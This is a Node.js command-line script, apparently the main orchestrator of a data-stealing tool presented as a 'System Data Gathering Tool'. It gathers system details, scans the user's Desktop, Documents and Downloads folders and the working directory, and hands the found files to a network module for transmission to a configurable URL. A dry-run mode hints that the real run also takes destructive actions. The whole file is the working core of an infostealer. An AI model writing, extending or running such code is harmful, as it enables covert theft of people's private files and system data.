#!/usr/bin/env node

const os = require('os');
const path = require('path');
const systemInfoModule = require('./systemInfo');
const fileHandlerModule = require('./fileHandler');
const networkClientModule = require('./networkClient');

/**
 * Parses CLI arguments into an easily accessible object.
 * @returns {Object} Parsed arguments
 */
function parseArguments() {
    const args = process.argv.slice(2);
    const parsed = {
        isDryRun: false,
        url: process.env.TARGET_URL || null,
        path: null
    };

    args.forEach(arg => {
        if (arg === '--dry-run') {
            parsed.isDryRun = true;
        } else if (arg.startsWith('--url=')) {
            parsed.url = arg.split('=')[1];
        } else if (arg.startsWith('--path=')) {
            parsed.path = arg.split('=')[1];
        }
    });

    return parsed;
}

/**
 * Main orchestrator function.
 */
async function main() {
    console.log(`[INFO] Starting Node.js System Data Gathering Tool...`);
    
    const config = parseArguments();
    
    if (config.isDryRun) {
        console.log(`[INFO] DRY-RUN MODE ACTIVATED. No destructive actions or real transmissions will occur.`);
    }

    if (!config.url && !config.isDryRun) {
        console.log(`[WARNING] No target URL provided via --url= or TARGET_URL env var.`);
        console.log(`[WARNING] Transmission will be skipped or fail gracefully.`);
    }

    // 1. Gather System Info
    console.log(`[INFO] Gathering system information...`);
    const sysInfo = systemInfoModule.getSystemInfo();
    console.log(`[INFO] System OS: ${sysInfo.os.platform} (${sysInfo.os.architecture})`);
    console.log(`[INFO] Node Version: ${sysInfo.nodeVersion}`);
    
    // 2. Discover Files
    const targetDirs = [];
    if (config.path) {
        targetDirs.push(config.path);
    } else {
        targetDirs.push(path.join(os.homedir(), 'Desktop'));
        targetDirs.push(path.join(os.homedir(), 'Documents'));
        targetDirs.push(path.join(os.homedir(), 'Downloads'));
        targetDirs.push(process.cwd()); // Fallback for cloud/Linux containers
    }

    let allFiles = [];
    for (const dir of targetDirs) {
        console.log(`[INFO] Scanning directory: ${dir}`);
        const files = await fileHandlerModule.scanDirectory(dir, config.isDryRun);
        allFiles = allFiles.concat(files);
    }
    console.log(`[INFO] Discovery complete. Found ${allFiles.length} file(s) to process.`);

    // 3. Network Transmission
    await networkClientModule.transmitData(sysInfo, allFiles, config.url, config.isDryRun, fileHandlerModule);

    console.log(`[INFO] Execution finished successfully.`);
}

// Execute the main loop
main().catch(err => {
    console.error(`[ERROR] Unhandled exception in main execution loop:`, err);
    process.exit(1);
});
